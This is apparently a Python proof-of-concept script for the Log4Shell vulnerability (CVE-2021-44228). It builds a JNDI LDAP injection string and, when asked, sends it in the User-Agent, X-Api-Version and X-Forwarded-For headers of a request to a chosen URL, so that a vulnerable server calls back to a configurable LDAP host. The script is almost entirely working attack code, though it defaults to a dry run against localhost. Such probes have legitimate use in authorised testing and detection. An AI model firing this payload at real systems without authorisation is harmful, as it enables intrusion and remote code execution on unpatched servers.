from __future__ import annotations

import argparse
import secrets
import sys
from dataclasses import dataclass
from typing import Dict, Optional

try:
    import requests
except ImportError:
    print("[-] Missing dependency: requests. Install with: pip install requests")
    sys.exit(1)


@dataclass
class Probe:
    url: str
    jndi_host: str
    jndi_port: int
    token: str

    @property
    def payload(self) -> str:
        return f"${{jndi:ldap://{self.jndi_host}:{self.jndi_port}/{self.token}}}"

    @property
    def headers(self) -> Dict[str, str]:
        return {
            "User-Agent": self.payload,
            "X-Api-Version": self.payload,
            "X-Forwarded-For": self.payload,
        }


def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Emulation PoC for CVE-2021-44228 (Log4Shell)")
    p.add_argument("--url", required=True)
    p.add_argument("--send", action="store_true")
    p.add_argument("--jndi-host", default="127.0.0.1")
    p.add_argument("--jndi-port", type=int, default=1389)
    p.add_argument("--timeout", type=float, default=5.0)
    return p


def send_request(probe: Probe, timeout: float) -> Optional[int]:
    try:
        r = requests.get(probe.url, headers=probe.headers, timeout=timeout, allow_redirects=False)
        return r.status_code
    except requests.RequestException:
        return None


def main() -> int:
    args = build_arg_parser().parse_args()

    token = secrets.token_hex(6)
    probe = Probe(url=args.url, jndi_host=args.jndi_host, jndi_port=args.jndi_port, token=token)

    print(f"[LOG] payload={probe.payload}")
    print(f"[LOG] token={token}")

    if not args.send:
        print("[LOG] dry_run=true")
        return 0

    status = send_request(probe, timeout=args.timeout)
    if status is None:
        print("[LOG] sent=false")
        return 2

    print(f"[LOG] sent=true status={status}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
